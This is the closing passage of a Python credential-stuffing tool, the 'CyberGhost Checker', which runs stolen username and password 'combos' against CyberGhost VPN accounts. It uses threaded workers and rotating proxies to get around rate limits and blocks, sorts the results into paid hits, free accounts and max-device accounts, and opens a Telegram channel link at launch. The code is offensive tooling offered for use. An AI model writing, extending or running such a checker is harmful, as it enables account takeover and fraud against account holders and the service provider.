    header = f"# CyberGhost Checker - {datetime.now().isoformat()}\n# by {AUTHOR_TAG}\n\n"
    for f in (HITS_FILE, MAXDEV_FILE, FREE_FILE, BAD_FILE, ERRORS_FILE):
        f.write(header)

    TOTAL_COMBOS = len(combos)

    L("📊", "INFO", "FILE", f"Loaded {TOTAL_COMBOS} combos")
    L("⚙️", "INFO", "CONFIG", f"Threads: {CONFIG['threads']} | Timeout: {CONFIG['timeout']}s | Retries: {CONFIG['retries']} | RL Backoff: {CONFIG['rate_limit_backoff']}s | Cooldown: {CONFIG['cooldown_on_429']}s | Debug: {CONFIG['debug']}")

    working_proxies = get_working_proxies(proxies) if proxies else []
    PROXY_POOL = working_proxies
    BAD_PROXIES.clear()

    max_threads = CONFIG["threads"]
    sem = threading.BoundedSemaphore(max_threads)

    def worker(combo):
        if stop_event.is_set():
            return
        try:
            sem.acquire()
            proxy = _pick_proxy()
            process_combo(combo, proxy)
        finally:
            sem.release()

    threads = []
    for combo in combos:
        if stop_event.is_set():
            break
        t = threading.Thread(target=worker, args=(combo,))
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(0.01)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        stop_event.set()
        L("🛑", "WARN", "STOP", "Stopping... waiting for threads to finish")
        for t in threads:
            t.join(timeout=2)

    for f in (HITS_FILE, MAXDEV_FILE, FREE_FILE, BAD_FILE, ERRORS_FILE):
        f.close()

    renames = [
        ("cyberghost_hits.txt", f"cyberghost_hits_{stats['hits']}.txt"),
        ("cyberghost_maxdev.txt", f"cyberghost_maxdev_{stats['maxdev']}.txt"),
        ("cyberghost_free.txt", f"cyberghost_free_{stats['free']}.txt"),
        ("cyberghost_bad.txt", f"cyberghost_bad_{stats['bad']}.txt"),
        ("cyberghost_errors.txt", f"cyberghost_errors_{stats['errors']}.txt"),
    ]
    for old_name, new_name in renames:
        old_p = os.path.join(SESSION_FOLDER, old_name)
        new_p = os.path.join(SESSION_FOLDER, new_name)
        if os.path.exists(old_p):
            os.rename(old_p, new_p)

    L("💾", "INFO", "SAVE", f"Results in {SESSION_FOLDER}")

    divider()
    elapsed = time.time() - START_TIME
    summary_box([
        ("Total", TOTAL_COMBOS),
        ("Hits (paid)", stats["hits"]),
        ("Free", stats["free"]),
        ("Max Devices", stats["maxdev"]),
        ("Bad", stats["bad"]),
        ("Errors", stats["errors"]),
        ("Rate Limited", stats["rate_limited"]),
        ("Blocks", stats["blocks"]),
        ("Proxy Fails", stats["proxy_fails"]),
        ("Retries", stats["retries"]),
        ("Time", f"{elapsed:.1f}s"),
        ("Folder", SESSION_FOLDER),
    ])

    input(f"{_c('93', '[*] Press Enter to continue...')}")


def main():
    _v("main")
    _open_url('https://t.me/darkhuchannel')
    banner(TOOL_NAME, "CyberGhost VPN Account Validator")
    proxies = load_proxies()

    while True:
        _v("menu")
        section("MAIN MENU")
        if proxies:
            L("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            L("⚠️", "WARN", "PROXY", "No proxies - direct connection")

        print(_c("96", "[1] Single check"))
        print(_c("96", "[2] Bulk check from file"))
        print(_c("96", "[3] Settings"))
        print(_c("96", "[4] Exit"))

        choice = input(f"{_c('93', '[*] Select: ')}").strip()

        if choice == "1":
            single_check_mode(proxies)
        elif choice == "2":
            stop_event.clear()
            bulk_check_mode(proxies)
        elif choice == "3":
            settings_menu()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            L("❌", "ERROR", "INPUT", "Invalid choice")


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(1)
